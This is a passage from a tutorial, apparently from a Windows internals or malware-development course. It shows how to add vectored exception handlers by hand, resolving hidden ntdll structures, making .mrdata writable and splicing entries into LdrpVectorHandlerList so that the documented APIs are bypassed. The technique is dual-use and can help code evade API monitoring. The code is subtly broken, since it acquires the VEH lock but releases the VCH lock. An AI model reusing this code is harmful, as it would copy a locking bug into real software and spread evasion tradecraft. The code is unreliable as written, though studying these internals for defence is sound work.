</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Bitmasks that will be used with this function are as follows:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROCESS_USING_VEH</span> <span class="token expression"><span class="token number">0x4</span>		</span><span class="token comment">// Indicates that the process is using vectored exception handlers.</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROCESS_USING_VCH</span> <span class="token expression"><span class="token number">0x8</span>		</span><span class="token comment">// Indicates that the process is using vectored continue handlers.</span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>By flipping these bits appropriately, the <code>FlipBit</code> 
function ensures that the operating system is aware of the process's use
 of vectored handlers, which is critical for proper exception handling.</p>
<h3 id="toc-heading-14">Handling Control Flow Guard (CFG)</h3>
<p>CFG is integral to managing where vectored handler entries are 
stored, and thus, several helper functions or wrappers are employed to 
interact with its configuration. This section details one such helper 
function that determines whether CFG is enabled for a given process.</p>
<h4 id="toc-heading-15">The CheckCFGStatus Function</h4>
<p>The <code>CheckCFGStatus</code> function is designed to verify if CFG is active for a specific process. It achieves this by invoking the WinAPI function <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy" target="_blank">GetProcessMitigationPolicy</a> along with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-process_mitigation_control_flow_guard_policy" target="_blank">ProcessControlFlowGuardPolicy</a>
 structure. This structure provides detailed information regarding the 
CFG settings for the process. Essentially, the function retrieves the 
CFG configuration and returns a Boolean value indicating whether CFG is 
enabled. <code>CheckCFGStatus</code> require a single parameter:</p>
<ul>
<li><code>hProcess</code> - A handle to the process for which the CFG 
status is being queried. This handle is used by the API to identify and 
access the appropriate process. The <code>CheckCFGStatus</code> function is shown below:</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span>IN HANDLE hProcess<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY ProcCfg <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// Retrieve the CFG policy for the specified process</span>
    <span class="token function">GetProcessMitigationPolicy</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> ProcessControlFlowGuardPolicy<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ProcCfg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ProcCfg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Return whether CFG is enabled</span>
    <span class="token keyword">return</span> ProcCfg<span class="token punctuation">.</span>EnableControlFlowGuard<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-16">The LdrProtectMrdataWrapper Function</h4>
<p>The <code>LdrProtectMrdataWrapper</code> function shown below acts as a simple wrapper that indirectly jumps to the <code>LdrProtectMrdata</code> function instead of calling it directly. This indirect approach is necessary because <code>LdrProtectMrdata</code>
 is a dynamically resolved internal function whose starting address is 
not guaranteed to be 16-byte aligned. When CFG is enabled, a direct call
 to this function could trigger a <code>FAST_FAIL_GUARD_ICALL_CHECK_FAILURE</code>
 error due to misalignment. To address this issue with minimal overhead,
 the wrapper employs an indirect jump. This technique will also be 
applied to other internal functions used throughout the module to 
maintain consistency and avoid similar CFG-related issues.</p>
<p>The <code>LdrProtectMrdataWrapper</code> function will be called with the following parameters:</p>
<ul>
<li><code>BOOL</code> - A flag determining the protection state of the <code>.mrdata</code> section. Passing <code>FALSE</code> makes it read-write (RW), whereas <code>TRUE</code> makes it "Read-Only".</li>
<li><code>PVOID</code> - The address of <code>LdrProtectMrdata</code>.</li>
</ul>
<div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm">LdrProtectMrdataWrapper proc

	xor rax, rax
	jmp rdx

LdrProtectMrdataWrapper endp
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-17">The RtlProtectHeapWrapper Function</h4>
<p>The <code>RtlProtectHeapWrapper</code> function serves as an indirect wrapper for calling the <a href="https://ntdoc.m417z.com/rtlprotectheap" target="_blank">RtlProtectHeap</a> function. Similar to the previous wrapper (<code>LdrProtectMrdataWrapper</code>),
 it avoids directly calling the internal function due to potential CFG 
issues caused by misaligned function addresses. Instead, the wrapper 
utilizes an indirect jump to minimize overhead while ensuring 
compatibility when CFG is enabled.</p>
<p>The <code>RtlProtectHeapWrapper</code> function will be called with the following parameters:</p>
<ul>
<li>
<p><code>PVOID</code> - A pointer to <code>LdrpMrdataHeap</code> heap.</p>
</li>
<li>
<p><code>BOOL</code> - A flag determining the protection state of the <code>.mrdata</code> section. Passing <code>FALSE</code> makes it read-write (RW), whereas <code>TRUE</code> makes it "Read-Only".</p>
</li>
<li>
<p><code>PVOID</code> - The address of <code>RtlProtectHeap</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm">RtlProtectHeapWrapper proc

	xor rax, rax
	jmp r8

RtlProtectHeapWrapper endp
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-18">The LdrEnsureMrdataHeapExistsWrapper Function</h4>
<p>The <code>LdrEnsureMrdataHeapExistsWrapper</code> function is another wrapper that indirectly jumps to the <code>LdrEnsureMrdataHeapExists</code> function. Its purpose is to ensure that the <code>.mrdata</code> heap is initialized, while maintaining compatibility with CFG by avoiding a direct call to the internal function. <code>LdrEnsureMrdataHeapExistsWrapper</code> requires a single parameter:</p>
<ul>
<li><code>PVOID</code> - The Address of <code>LdrEnsureMrdataHeapExists</code>.</li>
</ul>
<div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm">LdrEnsureMrdataHeapExistsWrapper proc

	xor rax, rax
	jmp rcx

LdrEnsureMrdataHeapExistsWrapper endp
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>All of the previously discussed assembly wrappers are declared in our C source file using the <code>extern</code> keyword.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">FlipBit</span><span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>BOOL<span class="token punctuation">,</span> PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">LdrEnsureMrdataHeapExistsWrapper</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">,</span> BOOL<span class="token punctuation">,</span> PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-19">The AddVectoredExceptionHandlerReplacement And AddVectoredContinueHandlerReplacement Functions</h3>
<p>This section will demonstrate the manual addition of both types of vectored handlers. The replacement functions <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> will be named <code>AddVectoredExceptionHandlerReplacement</code> and <code>AddVectoredContinueHandlerReplacement</code> respectively which will follow the below steps:</p>
<ol>
<li>
<p>Resolve the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
<li>
<p>Resolve the address of <code>LdrProtectMrdata</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
<li>
<p>Verify whether <code>LdrpMrdataHeap</code> is already allocated; if it isn't, invoke <code>LdrEnsureMrdataHeapExists</code> to create it.</p>
</li>
<li>
<p>Allocate a <code>VECTORED_HANDLER_ENTRY</code> either on the default heap or, if CFG is active, on <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>Check if the handler list is empty and update the corresponding flag in <code>PEB.CrossProcessFlags</code> accordingly.</p>
</li>
<li>
<p>Modify <code>LdrpVectorHandlerList</code> and/or adjust existing entries as required.</p>
</li>
</ol>
<br>
<h4 id="toc-heading-20">Resolving The Location Of Internal Functions And Variables</h4>
<p>The first step when it comes to vectored handler manipulation is resolving the location of <code>LdrpVectorHandlerList</code>.
 As previously mentioned, this variable holds everything related to 
registered vectored handlers in a process and is, therefore, the first 
thing we need to obtain. Besides <code>LdrpVectorHandlerList</code>, <code>LdrProtectMrdata</code> will also be obtained to edit the memory protection of <code>.mrdata</code> to be able to edit <code>LdrpVectorHandlerList</code>. It is also possible to acquire <code>LdrpMrdataLock</code> and call <code>NtProtectVirtualMemory</code> ourselves; however, for minimum overhead, <code>LdrProtectMrdata</code> will be used.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">fnLdrProtectMrdata		pLdrProtectMrdata		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
HMODULE					hNtdll					<span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpVectorHandlerList @ 0x%p\n"</span><span class="token punctuation">,</span> pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrProtectMrdata \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrProtectMrdata @ 0x%p \n"</span><span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-21">Checking If CFG Is Enabled</h4>
<p>To make our replacement functions work alongside CFG, a simple check is used with the previously constructed <code>CheckCFGStatus</code> function. When CFG is enabled, our replacement functions will utilize <code>LdrpMrdataHeap</code>
 instead of the process's default heap for storing vectored handler 
entries, thereby addressing potential issues that may occur when 
removing vectored handlers later.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL	bCfg						<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
HANDLE	hHeap						<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
PVOID	pLdrpMrdataHeap				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
		pLdrEnsureMrdataHeapExists	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


<span class="token comment">// Query CFG status in our process</span>
bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] CFG Enabled\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Resolving "RtlProtectHeap"</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Resolving "LdrpMrdataHeap"</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrpMrdataHeap</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrpMrdataHeap \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// If "LdrpMrdataHeap" doesn't point to anything, it isn't present</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Resolving the location of "LdrEnsureMrdataHeapExists"</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrEnsureMrdataHeapExists</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Resolving LdrEnsureMrdataHeapExists\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Calling the wrapper to allocate "LdrpMrdataHeap"</span>
		<span class="token function">LdrEnsureMrdataHeapExistsWrapper</span><span class="token punctuation">(</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n"</span><span class="token punctuation">,</span> pLdrpMrdataHeap<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Use "LdrpMrdataHeap" to store our new entry we will add instead of the default process heap</span>
	hHeap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">;</span>
	<span class="token comment">// Make it RW</span>
	<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-22">Determining If the List Is Empty</h4>
<p>The registered vectored handlers are stored in a circular linked list, which means that <code>LdrpVectorHandlerList-&gt;FirstVEH</code>/<code>LdrpVectorHandlerList-&gt;LastVEH</code>
 point back to the start of the corresponding list when it's empty. 
Therefore, to determine if we don't have any entries, we'll do the 
following check:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL	bEmpty			<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
PVOID	pVehListStart	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

<span class="token comment">// Acquire SRW lock to avoid a data race</span>
<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// LdrpVectorHandlerList + 0x8</span>
pVehListStart <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

bEmpty <span class="token operator">=</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">==</span> pVehListStart<span class="token punctuation">)</span> <span class="token operator">?</span> TRUE <span class="token operator">:</span> FALSE<span class="token punctuation">;</span> 

<span class="token comment">//Make .mrdata RW as we'll be editing it most likely later on</span>
<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<img src="69_files/empty-list.png" style="margin:auto" width="1200px">
<p>The same logic applies to VCH, as can be seen from the picture showcasing <code>LdrpVectorHandlerList</code> for a process with no registered vectored handlers.</p>
<h4 id="toc-heading-23">Allocating a Vectored Handler Entry</h4>
<p>To add a new VEH/VCH handler, one should first create a new <code>VECTORED_HANDLER_ENTRY</code> entry, which is, by default, allocated on the default process heap (obtained via <code>GetProcessHeap</code>). However, if CFG is enabled, it will instead be allocated on <code>LdrpMrdataHeap</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">HANDLE					hHeap						<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pNewVectoredHandlerEntry	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
SIZE_T					sVectoredHandlerEntry		<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>

<span class="token comment">// Check if CFG is enabled</span>
<span class="token comment">// If CFG is enabled, "hHeap" will hold the address of "LdrpMrdataHeap" instead of the default heap</span>

<span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pNewVectoredHandlerEntry <span class="token operator">=</span> <span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"HeapAlloc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-24">Inserting The New Handler Into LdrpVectorHandlerList</h4>
<p>In the case where the list is empty, the replacement functions set the <code>ProcessUsingVEH</code> (in <code>AddVectoredExceptionHandlerReplacement</code>) or <code>ProcessUsingVCH</code> (in <code>AddVectoredContinueHandlerReplacement</code>) bits by calling <code>FlipBit</code> with the <code>PROCESS_USING_VEH</code> and <code>PROCESS_USING_VCH</code>
 bitmask, respectively. Following this, the functions will complete the 
circular linked list by setting the new entrys forward and backward 
links to the start of the list and mark the new entry as the last 
element in the list.</p>
<p>If the list is not empty and the new entry should be inserted at the 
beginning. In this scenario, the new entrys forward link is set to the 
current first handler, and the original first handlers backward link is
 updated to point to the new entry.</p>
<p>Finally, in both situations (whether the list is empty or not), the 
replacement functions update the list so that the new entry becomes the 
first handler in <code>LdrpVectorHandlerList</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty <span class="token operator">||</span> bFirst<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the Start \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] No VEH(s) Currently Registered, Setting ProcessUsingVEH Bit \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Set "ProcessUsingVEH" bit</span>
		<span class="token function">FlipBit</span><span class="token punctuation">(</span>PROCESS_USING_VEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Complete the circular linked list</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>

		<span class="token comment">// Since there are no other handlers, we are also the last entry in the list</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Pushing First Entry Down the List \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Our new entry needs to point to the original first handler</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token punctuation">;</span>

		<span class="token comment">// The original first handlers backwards link will need to point to our new entry instead of the start of the list</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Update the list so that our added entry is first</span>
	pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The following image showcases pushing the first entry down the list:</p>
<img src="69_files/insert-as-first.png" style="margin:auto" width="800px">
<p>On the other hand, if the list isn't empty, and the new vectored 
handler should be last, the following path is taken where the current 
last vectored handlers <code>Entry.Flink</code> is updated to point to our entry instead of the start of the <code>VEH</code> list. The new entries <code>Entry.Flink</code> will instead point to the start of the list to make the list layout valid.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty <span class="token operator">||</span> bFirst<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the End \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get the last entry</span>
	pVectoredHandlerEntry <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH<span class="token punctuation">;</span>

	<span class="token comment">// Instead of pointing back to the start of the list, point to us</span>
	pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>

	<span class="token comment">// Our entry is last, needs to point to the start</span>
	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>

	<span class="token comment">// Make our entry point to the original last entry</span>
	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token punctuation">;</span>

	<span class="token comment">// Update the list</span>
	pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<img src="69_files/insert-as-last.png" style="margin:auto" width="800px">
<br>
<h4 id="toc-heading-25">Finishing Up</h4>
<p>The Final required action is to setup the reference counter and 
encode the pointer to the actual function we wish to register as a 
vectored handler. The memory protection of <code>.mrdata</code>, and if needed, <code>LdrpMrdataHeap</code>, will be marked as "Read-Only" again.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Release the VEH lock</span>
<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Revert .mrdata protection (make R/O)</span>
<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Refs <span class="token operator">=</span> <span class="token operator">&amp;</span>g_Ref<span class="token punctuation">;</span> <span class="token comment">// Global variable in our program, can also use a counter from an existing entry</span>
pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>VectoredHandler <span class="token operator">=</span> <span class="token function">EncodePointer</span><span class="token punctuation">(</span>pHandlerFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

